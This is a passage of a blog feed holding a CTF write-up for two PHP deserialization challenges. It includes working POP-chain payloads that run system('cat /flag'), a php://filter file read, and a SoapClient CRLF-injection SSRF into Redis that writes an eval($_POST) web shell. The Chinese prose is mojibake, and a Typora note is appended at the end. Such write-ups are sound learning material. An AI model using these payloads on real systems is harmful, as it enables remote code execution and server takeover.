<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ˜æ˜¾çš„ååºåˆ—åŒ–</p>
<p>çœ‹è§æœ‰å››ä¸ªç±»ï¼Œåˆ†åˆ«æ˜¯<code>fineï¼Œshowï¼Œsorryï¼Œsecret_code</code></p>
<p>çœ‹åˆ°ä¸€ä¸ªè°ƒç”¨å‡½æ•°<code>call_user_func()</code>ï¼Œè¿™ä¸ªå¯ä»¥åˆ©ç”¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯çœ‹æ€ä¹ˆå¯ä»¥è°ƒç”¨åˆ°è¿™é‡Œ</p>
<p>2.æƒ³è¦è°ƒç”¨<code>call_user_func()</code>å‡½æ•°ï¼Œéœ€è¦ç”¨åˆ°<code>__invoke</code>æ–¹æ³•ï¼Œ<code>__invoke</code>æ–¹æ³•å½“ç”¨ä¸€ä¸ªè°ƒç”¨å‡½æ•°çš„æ–¹å¼æ¥è°ƒç”¨å¯¹è±¡ä¼šè‡ªåŠ¨ä½¿ç”¨</p>
<p><code>sorry</code>ç±»ä¸­æœ‰ä¸€ä¸ª<code>name();</code>å¯ä»¥åˆ©ç”¨è¿™ä¸ªï¼Œæƒ³è¦åˆ©ç”¨è¿™ä¸ªè¿˜å¾—ç”¨åˆ°<code>__get</code>æ–¹æ³•ï¼Œ<code>__get</code>æ–¹æ³•è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶è°ƒç”¨</p>
<p><code>secret_code</code>ç±»ä¸­æœ‰<code>return $this-&gt;code-&gt;secret;</code>ï¼Œä½†æ˜¯ä»£ç ä¸­å¹¶æ²¡æœ‰secretå±æ€§ï¼Œå¯ä»¥è°ƒç”¨<code>__get</code>æ–¹æ³•</p>
<p><code>show()</code>æ–¹æ³•æ€æ ·è°ƒç”¨å‘¢ï¼Œ<code>show</code>ç±»çš„<code>__toString</code>æ–¹æ³•å¯ä»¥è°ƒç”¨<code>show()</code>æ–¹æ³•ï¼Œ<code>__toString</code>æ–¹æ³•å½“å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨ä¼šè°ƒç”¨</p>
<p><code>sorryç±»</code>ä¸­<code>__destruct</code>æ–¹æ³•çš„<code>echo $this-&gt;hint;</code>å¯ä»¥åˆ©ç”¨</p>
<p>3.popé“¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sorry:__destruct -&gt; show:__toString -&gt; secret_code:show() -&gt; sorry:__get -&gt; fine:__invoke</span><br></pre></td></tr></table></figure>

<p>ç”±äºæƒ³è¦åˆ©ç”¨<code>sorry</code>ç±»ä¸­çš„<code>hint</code>å±æ€§ï¼Œéœ€è¦å…ˆé€šè¿‡<code>if ($this-&gt;password == $this-&gt;name)</code>ï¼Œä½†æ˜¯ä»£ç ä¸­æœ‰<code>setPassword(md5(mt_rand()));</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¼šç»™<code>password</code>éšæœºèµ‹å€¼ï¼Œé€šè¿‡å¼±ç­‰äºï¼Œå¯ä»¥è®©<code>name</code>ç­‰äº<code>0</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0</span>==<span class="string">&quot;fs12hasasd2342523dha&quot;</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0</span>==<span class="string">&quot;1313fs12hasasd2342523dha&quot;</span>);  <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä¼šè¿”å›<code>true</code>ï¼Œè™½ç„¶ä¸‹é¢ä¼šè¿”å›<code>false</code>ï¼Œä½†éšæœºæ•°ï¼Œæ€»ä¼š<code>true</code>çš„æƒ…å†µ</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line"><span class="comment">//    public $time = &quot;Two and a half years&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key= <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code=<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;hint=<span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;hint-&gt;ctf=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$str</span> =  <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$str1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fine&quot;:2&#x27;</span>,<span class="string">&#x27;fine&quot;:5&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>((<span class="variable">$str1</span>));</span><br></pre></td></tr></table></figure>

<p>å› ä¸º<code>code</code>æ˜¯ä¸€ä¸ª<code>protected</code>å±æ€§çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨ç±»é‡Œé¢ä½¿ç”¨<code>__construct()</code>æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–</p>
<h2 id="EasyLove"><a href="#EasyLove" class="headerlink" title="EasyLove"></a>EasyLove</h2><p>1.æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$wllm</span>,<span class="variable">$arsenetang</span>,<span class="variable">$l61q4cheng</span>,<span class="variable">$love</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wllm = <span class="variable">$wllm</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arsenetang = <span class="variable">$arsenetang</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;l61q4cheng = <span class="variable">$l61q4cheng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="variable">$love</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt; hint.<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hello</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$world</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hello</span>);  </span><br></pre></td></tr></table></figure>

<p>æ˜¯ä¸€ä¸ªååºåˆ—åŒ–</p>
<p>æ‰“å¼€é¶æœºçš„æ—¶å€™ç»™äº†ä¸€ä¸ªhintï¼Œ<code>Redisæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„æ•°æ®åº“ï¼</code></p>
<p>ç”¨çš„æ˜¯Redisåº“ï¼Œçœ‹æºç ä¸­è¿˜æœ‰ä¸€ä¸ªhint.phpï¼Œå…ˆè·å–è¿™ä¸ªä¸­çš„å†…å®¹</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hint</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°hint.phpçš„å†…å®¹æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&quot;My favorite database is Redis and My favorite day is 20220311&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>20220311æ˜¯Redisåº“çš„å¯†ç </p>
<p>2.æœ‰äº†å¯†ç ï¼Œä½†æ˜¯å¾—æƒ³åŠæ³•ç”¨åˆ°è¿™ä¸ªå¯†ç </p>
<p>è¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šè§¦å‘</p>
<p><img src="/2023/04/16/DASCTF%20X%20GFCTF%202022/image-20230416205629097.png" alt="image-20230416205629097"></p>
<p>åˆ†åˆ«çœ‹çœ‹è°ƒç”¨çš„è¿™ä¸¤ä¸ªå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag()æ–¹æ³•å…¶ä¸­æœ‰ä¸€ä¸ªgetflag()æ–¹æ³•ï¼Œä½†æ˜¯æºä»£ç ä¸­å¹¶æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œè¿™æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<code>__call</code>æ–¹æ³•ï¼Œå¯ä»¥ç”¨åˆ°SoapClientåŸç”Ÿç±»ï¼Œå¯ä»¥è§¦å‘SoapClientç±»ä¸­çš„<code>__call</code>æ–¹æ³•ï¼Œå¯ä»¥åˆ©ç”¨newnewnew()æ–¹æ³•æ¥å®ä¾‹åŒ–ä¸€ä¸ªè¯¥ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SoapClientç±»éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œæ„é€ çš„æ—¶å€™ä¸€èˆ¬ç”¨Nullï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸ªæ•°ç»„</span><br><span class="line">åœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œå¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå¯ä»¥é€šè¿‡urié€‰é¡¹å‘rediså†™æœ¨é©¬</span><br></pre></td></tr></table></figure>

<p>å†™å…¥çš„æœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AUTH 20220311 //éªŒè¯å®¢æˆ·ç«¯é“¾æ¥</span><br><span class="line">CONFIG SET dir /var/www/html  //è®¾ç½®å†™å…¥çš„ç›®å½•</span><br><span class="line">SET x &#x27;&lt;?@eval(\$_POST[a]);?&gt;&#x27;  //è®¾ç½®å†™å…¥çš„å†…å®¹</span><br><span class="line">CONFIG SET dbfilename a.php  //è®¾ç½®å†™å…¥çš„æ–‡ä»¶å</span><br><span class="line">SAVE  //ä¿å­˜ç»“æŸ</span><br></pre></td></tr></table></figure>

<p>2.Redisåº“çš„ä¸»æœºæœåŠ¡ä¸€èˆ¬æ˜¯6379</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wllm = <span class="string">&quot;SoapClient&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arsenetang = Null;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;l61q4cheng= <span class="keyword">array</span>(<span class="string">&quot;location&quot;</span>=&gt;<span class="string">&quot;http://127.0.0.1:6379&quot;</span>,<span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hello\r\nAUTH 20220311\r\nCONFIG SET dir /var/www/html\r\nSET x &#x27;&lt;?@eval(\$_POST[a]);?&gt;&#x27;\r\nCONFIG SET dbfilename a.php\r\nSAVE\r\nhello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>));</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥åºåˆ—åŒ–çš„ä¸œè¥¿åï¼Œæ‰“å¼€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://510c040e-2d70-4e6f-a8b0-e3df753ad904.node4.buuoj.cn:81/a.php</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰404ï¼Œè¿æ¥èšå‰‘ï¼ŒæˆåŠŸè¿æ¥</p>
<p>ä½†æ˜¯æ ¹ç›®å½•ä¸‹å¹¶æ²¡æœ‰flagï¼Œæœ‰ä¸€ä¸ªstatr.sh</p>
<p><img src="/2023/04/16/DASCTF%20X%20GFCTF%202022/image-20230416210431478.png" alt="image-20230416210431478"></p>
<p>æ ¹æ®è¿™ä¸ªå¯ä»¥çŸ¥é“flagåœ¨<code>/hereisflag/flllll111aaagg</code>ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨dateå‘½ä»¤æ‰“å¼€<code>flllll111aaagg</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date -f å¯ä»¥æ‰“å¼€æŒ‡å®šæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/16/DASCTF%20X%20GFCTF%202022/image-20230416210724321.png" alt="image-20230416210724321"></p>
]]></content>
  </entry>
  <entry>
    <title>Typoraç”¨æ³•</title>
    <url>/2022/10/04/Typora%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>TyporaåŸºæœ¬ç”¨æ³•</p>
<span id="more"></span>

<h6 id="1-æ ‡é¢˜å¿«æ·é”®æ˜¯ctrl-æ•°å­—"><a href="#1-æ ‡é¢˜å¿«æ·é”®æ˜¯ctrl-æ•°å­—" class="headerlink" title="1.æ ‡é¢˜å¿«æ·é”®æ˜¯ctrl+æ•°å­—"></a>1.æ ‡é¢˜å¿«æ·é”®æ˜¯ctrl+æ•°å­—</h6><h6 id="2-è®©å­—ä½“å±…ä¸­æ˜¾ç¤º"><a href="#2-è®©å­—ä½“å±…ä¸­æ˜¾ç¤º" class="headerlink" title="2.è®©å­—ä½“å±…ä¸­æ˜¾ç¤º"></a>2.è®©å­—ä½“å±…ä¸­æ˜¾ç¤º</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;å±…ä¸­&lt;/center&gt;</span><br><span class="line">&lt;p align=&quot;left&quot;&gt;å·¦å¯¹é½&lt;/p&gt;</span><br><span class="line">&lt;p align=&quot;right&quot;&gt;å³å¯¹é½&lt;/p&gt;</span><br></pre></td></tr></table></figure>

